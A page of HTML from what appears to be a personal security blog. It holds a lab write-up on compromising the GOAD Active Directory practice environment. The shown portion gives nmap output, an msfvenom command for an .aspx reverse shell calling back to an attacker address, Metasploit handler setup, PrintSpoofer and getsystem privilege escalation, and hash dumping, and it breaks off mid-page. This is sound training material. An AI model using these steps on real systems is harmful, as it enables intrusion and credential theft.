@@ -1,0 +1,1230 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Here I go through my process of exploiting the GOAD environment">
+<title>Active Directory Part 2 - Exploring GOAD Environment</title>
+
+<link rel='canonical' href='http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/'>
+
+<link rel="stylesheet" href="/scss/style.min.b9c8156d464c343bdacaf14a871581fb94cbbdb9dd5cbce4ba017361187cc930.css"><meta property='og:title' content="Active Directory Part 2 - Exploring GOAD Environment">
+<meta property='og:description' content="Here I go through my process of exploiting the GOAD environment">
+<meta property='og:url' content='http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/'>
+<meta property='og:site_name' content='Dove'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Post' /><meta property='article:published_time' content='2025-01-21T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-01-21T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image9.png' />
+<meta name="twitter:title" content="Active Directory Part 2 - Exploring GOAD Environment">
+<meta name="twitter:description" content="Here I go through my process of exploiting the GOAD environment"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image9.png' />
+    <link rel="shortcut icon" href="/apple-touch-icon.png" />
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-TYMHMTK6Q6"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-TYMHMTK6Q6');
+        }
+      </script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Dove</a></h1>
+            <h2 class="site-description">I like breaking things :)</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/kd0ve'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/kat_ish_'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='https://kd0ve.github.io/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+                
+                <span>Landing Page</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='https://kdove.moe/blog/resources/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M21 14l-3 -3h-7a1 1 0 0 1 -1 -1v-6a1 1 0 0 1 1 -1h9a1 1 0 0 1 1 1v10" />
+  <path d="M14 15v2a1 1 0 0 1 -1 1h-7l-3 3v-10a1 1 0 0 1 1 -1h2" />
+</svg>
+
+
+
+                
+                <span>Resources</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/" selected>English</option>
+                                
+                                    <option value="http://localhost:1313/zh-cn/" >中文</option>
+                                
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#environments-used">Environments Used</a></li>
+    <li><a href="#utilities-used">Utilities Used</a></li>
+    <li><a href="#project-walkthrough">Project Walkthrough</a>
+      <ol>
+        <li><a href="#reconnaissance">Reconnaissance</a></li>
+        <li><a href="#weaponizing">Weaponizing</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+        <li><a href="#bloodhound">BloodHound</a></li>
+        <li><a href="#credential-gathering">Credential Gathering</a></li>
+        <li><a href="#sources">Sources</a></li>
+      </ol>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/active-directory-part-2-exploring-goad-environment/">
+                <img src="/p/active-directory-part-2-exploring-goad-environment/image9_hu12015936965919479696.png"
+                        srcset="/p/active-directory-part-2-exploring-goad-environment/image9_hu12015936965919479696.png 800w, /p/active-directory-part-2-exploring-goad-environment/image9_hu9236993439469323690.png 1600w"
+                        width="800" 
+                        height="367" 
+                        loading="lazy"
+                        alt="Featured image of post Active Directory Part 2 - Exploring GOAD Environment" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/write-ups/" >
+                Write-Ups
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/active-directory-part-2-exploring-goad-environment/">Active Directory Part 2 - Exploring GOAD Environment</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Here I go through my process of exploiting the GOAD environment
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 21, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    7 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="description">Description
+</h2><p>In this writeup, I&rsquo;m going to be going through my exploitation process with GOAD. This process was through my own investigation. I noticed the Castelblack machine was very insecure. It even had a file upload page when you visited the IP on a browser. I will go into how I exploited this and then gained higher privileges on the machine.</p>
+<h2 id="environments-used">Environments Used
+</h2><ul>
+<li>GOAD</li>
+<li>Kali</li>
+</ul>
+<h2 id="utilities-used">Utilities Used
+</h2><ul>
+<li>nmap</li>
+<li>metasploit</li>
+<li>msfvenom</li>
+<li>PrinterSpoofer</li>
+<li>evil-winrm</li>
+<li>sharphound</li>
+<li>bloodhound</li>
+<li>crackmapexec</li>
+<li>Impacket-GetNPUsers</li>
+<li>hashcat</li>
+</ul>
+<h2 id="project-walkthrough">Project Walkthrough
+</h2><h3 id="reconnaissance">Reconnaissance
+</h3><p>When I first started attacking the environment, I scanned the network with nmap. This gave me an idea of the services I would be encountering.</p>
+<p>I tried to connect through SMB on all of the machines, but the only one with anything exposed was the Castelblack machine. I figured this was a good starting point. Here is the nmap scan for Castelblack.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl">|_http-title: Site doesn&#39;t have a title (text/html).
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-01-20T20:46:29
+</span></span><span class="line"><span class="cl">|_Not valid after:  2055-01-20T20:46:29
+</span></span><span class="line"><span class="cl">| ms-sql-info: 
+</span></span><span class="line"><span class="cl">|   192.168.74.22:1433: 
+</span></span><span class="line"><span class="cl">|     Version: 
+</span></span><span class="line"><span class="cl">|       name: Microsoft SQL Server 2019 RTM
+</span></span><span class="line"><span class="cl">|       number: 15.00.2000.00
+</span></span><span class="line"><span class="cl">|       Product: Microsoft SQL Server 2019
+</span></span><span class="line"><span class="cl">|       Service pack level: RTM
+</span></span><span class="line"><span class="cl">|       Post-SP patches applied: false
+</span></span><span class="line"><span class="cl">|_    TCP port: 1433
+</span></span><span class="line"><span class="cl">| ms-sql-ntlm-info: 
+</span></span><span class="line"><span class="cl">|   192.168.74.22:1433: 
+</span></span><span class="line"><span class="cl">|     Target_Name: NORTH
+</span></span><span class="line"><span class="cl">|     NetBIOS_Domain_Name: NORTH
+</span></span><span class="line"><span class="cl">|     NetBIOS_Computer_Name: CASTELBLACK
+</span></span><span class="line"><span class="cl">|     DNS_Domain_Name: north.sevenkingdoms.local
+</span></span><span class="line"><span class="cl">|     DNS_Computer_Name: castelblack.north.sevenkingdoms.local
+</span></span><span class="line"><span class="cl">|     DNS_Tree_Name: sevenkingdoms.local
+</span></span><span class="line"><span class="cl">|_    Product_Version: 10.0.17763
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-01-20T22:45:06+00:00; 0s from scanner time.
+</span></span><span class="line"><span class="cl">3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=castelblack.north.sevenkingdoms.local
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-01-19T20:13:27
+</span></span><span class="line"><span class="cl">|_Not valid after:  2025-07-21T20:13:27
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-01-20T22:45:06+00:00; 0s from scanner time.
+</span></span><span class="line"><span class="cl">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class="line"><span class="cl">|_http-title: Not Found
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-01-20T22:45:06+00:00; 0s from scanner time.
+</span></span><span class="line"><span class="cl">|_http-title: Not Found
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=VAGRANT
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-01-19T11:21:16
+</span></span><span class="line"><span class="cl">|_Not valid after:  2028-01-19T11:21:16
+</span></span><span class="line"><span class="cl">| tls-alpn: 
+</span></span><span class="line"><span class="cl">|_  http/1.1
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:E4:82:DD (VMware)
+</span></span><span class="line"><span class="cl">Device type: general purpose
+</span></span><span class="line"><span class="cl">Running: Microsoft Windows 2019
+</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:microsoft:windows_server_2019
+</span></span><span class="line"><span class="cl">OS details: Microsoft Windows Server 2019
+</span></span><span class="line"><span class="cl">Network Distance: 1 hop
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl">| smb2-security-mode: 
+</span></span><span class="line"><span class="cl">|   3:1:1: 
+</span></span><span class="line"><span class="cl">|_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl">|_nbstat: NetBIOS name: CASTELBLACK, NetBIOS user: <span class="p">&lt;</span><span class="nt">unknown</span><span class="p">&gt;</span>, NetBIOS MAC: 00:0c:29:e4:82:dd (VMware)
+</span></span><span class="line"><span class="cl">| smb2-time: 
+</span></span><span class="line"><span class="cl">|   date: 2025-01-20T22:45:01
+</span></span><span class="line"><span class="cl">|_  start_date: N/A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The machine seems to have a web page that can be visited, so I went to the IP in my brower.</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image.png"
+	width="523"
+	height="228"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image_hu3644789445165404818.png 480w, /p/active-directory-part-2-exploring-goad-environment/image_hu16964745395945124413.png 1024w"
+	loading="lazy"
+	
+		alt="showing the landing page of the castelblack website"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="229"
+		data-flex-basis="550px"
+	
+></p>
+<p>I clicked the link, and there was a file upload tool that told you where the files were being uploaded to. This was a clear way to get shell.</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image1.png"
+	width="577"
+	height="219"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image1_hu7094727347148938969.png 480w, /p/active-directory-part-2-exploring-goad-environment/image1_hu13306337009676980623.png 1024w"
+	loading="lazy"
+	
+		alt="the upload files page of the castelblack website"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="263"
+		data-flex-basis="632px"
+	
+></p>
+<h3 id="weaponizing">Weaponizing
+</h3><p>I used msfvenom to craft a .aspx reverse shell. There are a variety of ways this can be done and payloads you can use. Initially, I used just a basic shell and listened for it with netcat. However, metasploit has a multi/handler tool that can be used to spawn meterpreter sessions, which give you a lot more wiggle room.</p>
+<p>To craft the exploit for this, you need to do the following msfvenom command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<span class="p">&lt;</span><span class="nt">attackerip</span><span class="p">&gt;</span> LPORT=4444 -f aspx -o shell.aspx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The port can be whatever you want, and it&rsquo;s typically best to avoid 4444 in a real situation as it is typically quickly picked up since it&rsquo;s the default for metasploit.</p>
+<p>Now, once you upload the generated payload to the file upload page, you can visit <code>/uploads/shell.aspx</code> while you have metasploit listening, and you should get a session.</p>
+<p>Make sure to do the following commands to get metasploit set up to catch the shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">msfconsole
+</span></span><span class="line"><span class="cl">use multi/handler
+</span></span><span class="line"><span class="cl">set payload windows/x64/meterpreter_reverse_tcp
+</span></span><span class="line"><span class="cl">set lhost <span class="p">&lt;</span><span class="nt">attackerip</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">set lport <span class="p">&lt;</span><span class="nt">portyouset</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="exploitation">Exploitation
+</h3><p>Now you can visit the shell uploaded, and a meterpreter session should spawn after a bit.</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image2.png"
+	width="871"
+	height="156"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image2_hu12764891538223497744.png 480w, /p/active-directory-part-2-exploring-goad-environment/image2_hu11282707203168226287.png 1024w"
+	loading="lazy"
+	
+		alt="the meterpreter shell spawning"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="558"
+		data-flex-basis="1340px"
+	
+></p>
+<p>The reason I went this route is there is a variety of things you can do with a meterpreter shell. Specifically, it makes it much easier to upload and download files. You can also spawn into a normal shell this way and then back out of it to use meterpreter commands.</p>
+<p>From here there are a variety of routes you can take. First, it&rsquo;s best to elevate privileges. If you check the user you spawn as and their privileges, you will see an interesting one:</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image3.png"
+	width="747"
+	height="355"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image3_hu14934653119392812267.png 480w, /p/active-directory-part-2-exploring-goad-environment/image3_hu10955280322680254665.png 1024w"
+	loading="lazy"
+	
+		alt="whoami command and whoami /priv command results"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="505px"
+	
+></p>
+<p>You&rsquo;ll see that you have the SeImpersonatePrivilege enabled. The two attacks that can exploit this are the JuicyPotato and <a class="link" href="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0"  target="_blank" rel="noopener"
+    >PrinterSpoofer</a> attacks.The JuicyPotato attack won&rsquo;t work with this machine as it&rsquo;s a Windows Server 2019 machine, so I went with PrinterSpoofer.</p>
+<p>You can do this manually by uploading the PrinterSpoofer64.exe to the box and running the following command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">PrintSpoofer.exe -i -c cmd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This should spawn an elevated shell.</p>
+<p>With meterpreter, all you need to do is go back into the meterpreter shell and type <code>getsystem</code> and it will elevate you to nt authority.</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image4.png"
+	width="672"
+	height="284"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image4_hu9971879519910405219.png 480w, /p/active-directory-part-2-exploring-goad-environment/image4_hu17037212203224852074.png 1024w"
+	loading="lazy"
+	
+		alt="using meterpreter to gain elevated privileges"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="236"
+		data-flex-basis="567px"
+	
+></p>
+<p>From here, you should be able to just type <code>hashdump</code> into the meterpreter window, and all the user hashes should drop:</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image5.png"
+	width="766"
+	height="157"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image5_hu15713556040192987483.png 480w, /p/active-directory-part-2-exploring-goad-environment/image5_hu12768770563393929339.png 1024w"
+	loading="lazy"
+	
+		alt="using meterpreter to dump hashes"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="487"
+		data-flex-basis="1170px"
+	
+></p>
+<p>From here, you can spawn a shell using evil-winrm with the Administrator hash.</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image6.png"
+	width="1101"
+	height="218"
